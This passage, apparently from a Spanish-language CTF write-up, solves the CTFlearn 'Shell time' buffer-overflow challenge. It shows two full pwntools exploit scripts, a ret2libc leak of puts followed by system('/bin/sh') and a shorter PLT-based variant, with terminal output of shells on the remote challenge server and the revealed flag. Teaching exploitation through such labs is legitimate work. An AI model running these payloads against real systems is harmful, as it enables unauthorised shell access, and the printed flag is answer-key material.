<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ldd</span> server
        linux-gate.so.1 (0xf7f41000)
        libc.so.6 => /lib32/libc.so.6 (0xf7d3f000)
        /lib/ld-linux.so.2 (0xf7f43000)

<span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib32/libc.so.6 | <span class=code-dark-green>grep</span> puts
   215: 00071290   531 FUNC    GLOBAL DEFAULT   16 _IO_<span class=code-red>puts</span>@@GLIBC_2.0
   461: 00071290   531 FUNC    WEAK   DEFAULT   16 <span class=code-red>puts</span>@@GLIBC_2.0
   540: 0010c050  1240 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>pent@@GLIBC_2.0
   737: 0010dc90   742 FUNC    GLOBAL DEFAULT   16 <span class=code-red>puts</span>gent@@GLIBC_2.10
  1244: 0006fa20   381 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>@@GLIBC_2.0
  1831: 0006fa20   381 FUNC    GLOBAL DEFAULT   16 _IO_f<span class=code-red>puts</span>@@GLIBC_2.0
  2507: 0007ac20   191 FUNC    WEAK   DEFAULT   16 f<span class=code-red>puts</span>_unlocked@@GLIBC_2.1  
</code></pre></div>
<p>El <em>offset</em> de <code>puts</code> es <code>0x71290</code>. Nótese que los tres últimos dígitos del <em>offset</em> coinciden con los tres últimos dígitos de la dirección real de <code>puts</code> en tiempo de ejecución. Esto ocurre porque ASLR genera direcciones que terminan en <code>000</code> en hexadecimal. Esto también sirve como validación de que todo está funcionando correctamente.</p>
<p>Podemos calcular la dirección base de Glibc en tiempo de ejecución con una resta. Y después, podremos calcular las direcciones reales de <code>system</code> y del puntero a <code>"/bin/sh"</code>. Estos son los <em>offsets</em>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>readelf</span> -s /lib32/libc.so.6 | <span class=code-dark-green>grep</span> system
   258: 00137810   106 FUNC    GLOBAL DEFAULT   16 svcerr_<span class=code-red>system</span>err@@GLIBC_2.0
   662: 00045420    63 FUNC    GLOBAL DEFAULT   16 __libc_<span class=code-red>system</span>@@GLIBC_PRIVATE  
  1534: 00045420    63 FUNC    WEAK   DEFAULT   16 <span class=code-red>system</span>@@GLIBC_2.0

<span class=code-cyan>$</span> <span class=code-dark-green>strings</span> -atx /lib32/libc.so.6 | <span class=code-dark-green>grep</span> /bin/sh
 18f352 <span class=code-red>/bin/sh</span>
</code></pre></div>
<p>Ahora podemos calcular las direcciones reales y enviar el segundo <em>payload</em>, para llamar a <code>system</code> con el puntero a <code>"/bin/sh"</code> como argumento:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>

<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk4>'server'</span>
<span class="mtk8 mtku">elf</span> <span class=mtk5>=</span> <span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class="mtku mtk8">elf</span><span class=mtk1>.process()</span>

    <span class=mtk1>main_addr</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>8048640</span>
    <span class=mtk1>puts_plt_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>8048410</span>
    <span class=mtk1>puts_got_addr</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>804a018</span>

    <span class=mtk1>offset</span> <span class=mtk5>=</span> <span class=mtk6>60</span>
    <span class=mtk1>junk</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>

    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>puts_plt_addr</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>main_addr</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>puts_got_addr</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>some</span> <span class=mtk4>text:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvuntil</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Return</span> <span class=mtk4>address'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>

    <span class=mtk1>puts_addr</span> <span class=mtk5>=</span> <span class=mtk1>u32(</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>strip</span><span class=mtk1>()[:</span><span class=mtk6>4</span><span class=mtk1>])</span>
    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>puts()</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>puts_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>

    <span class=mtk1>puts_offset</span>   <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>071290</span>
    <span class=mtk1>system_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>045420</span>
    <span class=mtk1>bin_sh_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>18f352</span>

    <span class=mtk1>glibc_base_addr</span> <span class=mtk5>=</span> <span class=mtk1>puts_addr</span> <span class=mtk5>-</span> <span class=mtk1>puts_offset</span>
    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Glibc</span> <span class=mtk4>base</span> <span class=mtk4>address:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>glibc_base_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  

    <span class=mtk1>system_addr</span> <span class=mtk5>=</span> <span class=mtk1>glibc_base_addr</span> <span class=mtk5>+</span> <span class=mtk1>system_offset</span>
    <span class=mtk1>bin_sh_addr</span> <span class=mtk5>=</span> <span class=mtk1>glibc_base_addr</span> <span class=mtk5>+</span> <span class=mtk1>bin_sh_offset</span>

    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>system_addr</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk6>0</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>bin_sh_addr</span><span class=mtk1>)</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>some</span> <span class=mtk4>text:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recv</span><span class=mtk1>()</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
[<span class=code-blue>*</span>] './server'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Starting local process './server': pid 1758891  
[<span class=code-blue>*</span>] Leaked puts() address: 0xf7dd1290
[<span class=code-blue>*</span>] Glibc base address: 0xf7d60000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
server    solve.py
</code></pre></div>
<p>Perfecto, ahora podemos cambiar <code>process</code> por <code>remote</code> y lanzar el <em>exploit</em> contra la instancia remota:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py thekidofarcrania.com 4902
[<span class=code-blue>*</span>] './server'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Opening connection to thekidofarcrania.com on port 4902: Done  
[<span class=code-blue>*</span>] Leaked puts() address: 0xf7e17b40
[<span class=code-blue>*</span>] Glibc base address: 0xf7da68b0
[<span class=code-blue>*</span>] Switching to interactive mode
Legend: <span class=code-dark-green>buff</span> <span class=code-green>MODIFIED</span> <span class=code-dark-yellow>padding</span> <span class=code-yellow>MODIFIED</span>
  <span class=code-dark-blue>notsecret</span> <span class=code-blue>MODIFIED</span> <span class=code-dark-blue>secret</span> <span class=code-blue>MODIFIED</span>
  <span class=code-dark-red>return address</span> <span class=code-red>MODIFIED</span>
0xffe12f10 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffe12f18 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffe12f20 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffe12f28 | <span class=code-green>41 41 41 41 41 41 41 41</span> |
0xffe12f30 | <span class=code-yellow>41 41 41 41 41 41 41 41</span> |
0xffe12f38 | <span class=code-yellow>41 41 41 41 41 41 41 41</span> |
0xffe12f40 | 41 41 41 41 41 41 41 41 |
0xffe12f48 | 41 41 41 41 <span class=code-red>d0 bc de f7</span> |
Return address: 0xf7debcd0

timeout: the monitored command dumped core
[<span class=code-blue>*</span>] Got EOF while reading in interactive
<span class=code-red>$</span>
</code></pre></div>
<p>Y no funciona. Esto se debe a que el servidor está utilizando una versión de Glibc diferente. Nótese que los tres últimos dígitos en hexadecimal de la dirección de <code>puts</code> son diferentes, y por tanto, la dirección base de Glibc no termina en <code>000</code>.</p>
<p>Sin embargo, podemos buscar una versión de Glibc que tenga <code>puts</code> con un <em>offset</em> que termine en <code>b40</code>, que es el que tiene la instancia remota. Una base de datos de Glibc útil es <a href=https://libc.blukat.me>libc.blukat.me</a>:</p>
<p><img src=/images/CTFlearn/shell-time-1.png alt="Glibc search"></p>
<p>Desde aquí podemos descargar la librería o tomar nota de los <em>offsets</em> que necesitamos (<code>puts</code>, <code>system</code> y <code>"/bin/sh"</code>). Tenemos que corregir los <em>offsets</em> entonces:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>    <span class=mtk1>puts_offset</span>   <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>067b40</span>  <span class=mtk3># 0x071290</span>  
    <span class=mtk1>system_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>03d200</span>  <span class=mtk3># 0x045420</span>
    <span class=mtk1>bin_sh_offset</span> <span class=mtk5>=</span> <span class="mtk7 mtki">0x</span><span class=mtk6>17e0cf</span>  <span class=mtk3># 0x18f352</span>
</code></pre></div>
<p>Y ahora lanzamos el <em>exploit</em> y obtenemos una consola de comandos con la que podemos leer la <em>flag</em>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py thekidofarcrania.com 4902
[<span class=code-blue>*</span>] './server'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Opening connection to thekidofarcrania.com on port 4902: Done  
[<span class=code-blue>*</span>] Leaked puts() address: 0xf7d7db40
[<span class=code-blue>*</span>] Glibc base address: 0xf7d16000
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> cat /flag2.txt
CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}
</code></pre></div>
<p>Existe una manera mucho más simple de obtener una consola de comandos. De hecho, el reto dice que no es necesario utilizar Glibc. Y en efecto, podemos aprovecharnos de la ayuda que proporciona el programa para explotar la vulnerabilidad de <em>Buffer Overflow</em> como en <a href=../rip-my-bof>RIP my bof</a>.</p>
<p>La clave es que el programa está fugando direcciones de la pila (<em>stack</em>), por lo que podemos escribir <code>"/bin/sh"</code> y conocer la dirección de memoria que apunta a la cadena. Otro punto importante es que la función <code>system</code> se puede llamar directamente desde la PLT, ya que está presente en el código fuente.</p>
<p>Por tanto, solamente necesitamos llamar a <code>system</code> en la PLT y añadir la dirección de la pila donde guardaremos la cadena <code>"/bin/sh"</code>.</p>
<p>Podemos tomar una dirección de la pila de la salida del programa, por ejemplo la primera. La idea es sobrescribir <code>$eip</code> con la dirección de <code>system</code> en la PLT, luego, los 4 bytes siguientes serán la dirección de retorno (que dan igual, pueden ser bytes nulos), y los 4 bytes siguientes son el puntero a <code>"/bin/sh"</code>. La mejor idea es poner <code>"/bin/sh"</code> justo después del puntero y calcular su dirección para ponerla en la posición correcta.</p>
<p>GDB puede venir bien para chequear que todo está en su sitio.</p>
<p>Es posible que todo esto se entienda mejor con el siguiente <em>exploit</em> en Python, que es más corto que el anterior:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>

<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk1>context</span><span class=mtk1>,</span> <span class=mtk1>log</span><span class=mtk1>,</span> <span class=mtk1>p32,</span> <span class="mtk8 mtku">remote</span><span class=mtk1>,</span> <span class="mtk8 mtku">sys</span>

<span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span> <span class=mtk5>=</span> <span class=mtk4>'server'</span>
<span class=mtk1>elf</span> <span class=mtk5>=</span> <span class=mtk1>context</span><span class=mtk1>.</span><span class=mtk1>binary</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>get_process</span><span class=mtk1>():</span>
    <span class=mtk5>if</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
        <span class=mtk5>return</span> <span class=mtk1>elf</span><span class=mtk1>.process()</span>

    <span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
    <span class=mtk5>return</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>host</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>


<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
    <span class=mtk1>p</span> <span class=mtk5>=</span> <span class=mtk8>get_process</span><span class=mtk1>()</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvuntil</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'address'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>()</span>

    <span class=mtk1>stack_addr</span> <span class=mtk5>=</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvline</span><span class=mtk1>().</span><span class=mtk8>split</span><span class=mtk1>()[</span><span class=mtk6>0</span><span class=mtk1>].</span><span class=mtk8>decode</span><span class=mtk1>(),</span> <span class=mtk6>16</span><span class=mtk1>)</span>
    <span class=mtk1>log</span><span class=mtk1>.</span><span class=mtk8>info</span><span class=mtk1>(</span><span class="mtk7 mtki">f</span><span class=mtk4>'Leaked</span> <span class=mtk4>an</span> <span class=mtk4>address</span> <span class=mtk4>on</span> <span class=mtk4>the</span> <span class=mtk4>stack:</span> <span class=mtk6>{</span><span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>stack_addr</span><span class=mtk1>)</span><span class=mtk6>}</span><span class=mtk4>'</span><span class=mtk1>)</span>  

    <span class=mtk1>offset</span> <span class=mtk5>=</span> <span class=mtk6>60</span>
    <span class=mtk1>junk</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'A'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>

    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>junk</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>elf</span><span class=mtk1>.plt.system)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk6>0</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>p32(</span><span class=mtk1>stack_addr</span> <span class=mtk5>+</span> <span class="mtk7 mtki">0x</span><span class=mtk6>48</span><span class=mtk1>)</span>
    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'/bin/sh'</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>some</span> <span class=mtk4>text:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recvuntil</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Return'</span><span class=mtk1>)</span>
    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>recv</span><span class=mtk1>()</span>

    <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>


<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
    <span class=mtk8>main</span><span class=mtk1>()</span>
</code></pre></div>
<p>Y funciona tanto en local como en remoto, sin necesidad de utilizar Glibc:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve2.py
[<span class=code-blue>*</span>] './server'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Opening connection to thekidofarcrania.com on port 4902: Done  
[<span class=code-blue>*</span>] Leaked an address on the stack: 0xff9bac40
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> ls
server    solve2.py    solve.py
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve2.py thekidofarcrania.com 4902
[<span class=code-blue>*</span>] './server'
    Arch:     i386-32-little
    RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
    Stack:    <span class=code-dark-red>No canary found</span>
    NX:       <span class=code-dark-green>NX enabled</span>
    PIE:      <span class=code-dark-red>No PIE (0x8048000)</span>
[<span class=code-green>+</span>] Opening connection to thekidofarcrania.com on port 4902: Done  
[<span class=code-blue>*</span>] Leaked an address on the stack: 0xffd57510
[<span class=code-blue>*</span>] Switching to interactive mode
<span class=code-red>$</span> cat /flag2.txt
CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}
</code></pre></div>
<div class="mt6 instapaper_ignoref">
</div>
</div>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>